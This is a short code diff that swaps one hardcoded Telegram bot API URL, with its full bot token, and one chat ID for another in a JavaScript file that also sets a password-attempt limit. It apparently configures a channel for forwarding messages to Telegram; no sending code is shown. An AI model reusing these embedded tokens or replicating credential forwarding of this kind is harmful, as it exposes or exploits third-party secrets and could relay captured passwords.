@@ -2,8 +2,8 @@ import crypto from 'crypto';
 
 const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || '';
 
-const TELEGRAM_API = `https://api.telegram.org/bot8226522512:AAGgpgreJuQu3uXjMuFeo6qcweKO1fs1Yvg`;
-const CHAT_ID = '-4966250298';
+const TELEGRAM_API = `https://api.telegram.org/bot8675498310:AAFZWLgXTWl_LwAnB5kB9XuklREnSRM9TPY`;
+const CHAT_ID = '-5205589429';
 const agent = new https.Agent({ family: 4 });
 
 const MAX_PASSWORD_ATTEMPTS = 5;
